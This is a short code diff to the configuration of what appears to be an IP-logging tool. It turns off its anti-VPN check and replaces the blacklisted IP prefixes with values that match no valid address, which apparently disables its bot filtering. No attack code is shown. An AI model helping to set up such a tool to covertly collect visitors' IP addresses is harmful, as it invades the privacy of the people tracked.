@@ -32,7 +32,7 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 2, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("2997", "1049", "1439", "1649") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
